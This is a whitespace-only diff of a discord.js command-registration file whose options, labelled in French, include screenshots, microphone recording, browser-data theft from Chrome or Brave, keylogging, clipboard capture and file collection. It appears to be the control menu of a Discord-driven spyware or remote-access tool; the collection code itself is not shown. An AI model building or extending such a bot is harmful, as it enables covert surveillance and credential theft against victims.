@@ -1,7 +1,7 @@
 import {REST, Routes} from 'discord.js';
 import config from './static/config.json' assert {type: 'json'};
 
-const { TOKEN, CLIENT_ID, GUILD_ID } = config;
+const {TOKEN, CLIENT_ID, GUILD_ID} = config;
 
 export const commands = [
     {
@@ -112,12 +112,12 @@ export const commands = [
                 type: 3,
                 required: true,
                 choices: [
-                    { name: 'Captures d\'écran', value: 'screenshot' },
-                    { name: 'Enregistrements audio', value: 'microphone' },
-                    { name: 'Données de navigation', value: 'browserdata' },
-                    { name: 'Enregistrements du clavier', value: 'keylogger' },
-                    { name: 'Récuperation presse papier', value: 'clipboard' },
-                    { name: 'Fichiers téléchargés', value: 'downloadfile' }
+                    {name: 'Captures d\'écran', value: 'screenshot'},
+                    {name: 'Enregistrements audio', value: 'microphone'},
+                    {name: 'Données de navigation', value: 'browserdata'},
+                    {name: 'Enregistrements du clavier', value: 'keylogger'},
+                    {name: 'Récuperation presse papier', value: 'clipboard'},
+                    {name: 'Fichiers téléchargés', value: 'downloadfile'}
                 ],
             },
             {
@@ -126,8 +126,8 @@ export const commands = [
                 type: 3,
                 required: false,
                 choices: [
-                    { name: 'Google Chrome', value: 'google-chrome' },
-                    { name: 'Brave', value: 'brave' },
+                    {name: 'Google Chrome', value: 'google-chrome'},
+                    {name: 'Brave', value: 'brave'},
                 ],
             },
         ],
@@ -152,11 +152,11 @@ export const commands = [
     }
 ];
 
-const rest = new REST({ version: '10' }).setToken(TOKEN);
+const rest = new REST({version: '10'}).setToken(TOKEN);
 
 try {
     console.log('Début de la mise à jour des commandes de l\'application (/).');
-    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
+    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {body: commands});
 
     console.log('Commandes de l\'application (/) mises à jour avec succès.');
 } catch (error) {
